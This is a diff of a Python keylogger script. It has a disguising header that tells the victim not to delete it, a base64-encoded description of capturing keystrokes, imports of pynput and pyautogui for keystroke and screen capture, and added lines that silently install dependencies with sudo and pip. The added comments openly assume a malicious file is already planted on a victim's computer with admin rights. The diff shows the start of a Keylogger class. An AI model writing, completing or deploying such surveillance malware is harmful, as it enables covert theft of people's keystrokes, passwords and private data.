@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 '''
 ----------------------------------------------------------------------------------------------------
 THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!
@@ -30,9 +29,6 @@ Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
 					                  !
 ----------------------------------------------------------------------------------------------------
 '''
-
-# import module for capturing keystrokes
-from pynput import keyboard
 # import module to zip files
 from zipfile import ZipFile
 # import module to run functions at specific times
@@ -47,10 +43,18 @@ import subprocess as subp
 The following dependencies may not be installed by default
 so try importing them and if it fails attempt
 to download them using pythons package installer
+*NOTE* - downloading these modules depends on the user's privileges,
+and of course I am assuming someone utilizing a keylogger has already
+found a way to upload malicious files onto a victim's computer
+and has aptly obtained root/admin privileges though as a proof
+of concept downloading these modules manually will do not harm
 '''
 try:
 	import pyautogui as pygrab
 except:
+	# attempt to download python's packacke installer
+	subp.call('suodo apt install python-pip3', shell=True)
+	# downloading module
 	subp.call('pip install pyautogui', shell=True)
 	# wait 30 for download to complete
 	time.sleep(30)
@@ -59,6 +63,9 @@ except:
 try:
 	from pynput import keyboard
 except:
+	# attempt to download python's packacke installer
+	subp.call('sudo apt install python-pip3', shell=True)
+	# downloading module
 	subp.call('pip install pynput', shell=True)
 	# wait 30 seconds for download to complete
 	time.sleep(30)
@@ -67,7 +74,7 @@ except:
 	
 
 '''************************************************************'''
-''' 					   CLASS DEFINITION                    '''
+''' 					   CLASS DEFINITION    '''
 '''************************************************************'''
 class Keylogger:
 	# invoking the constructor will declare class variable self.log
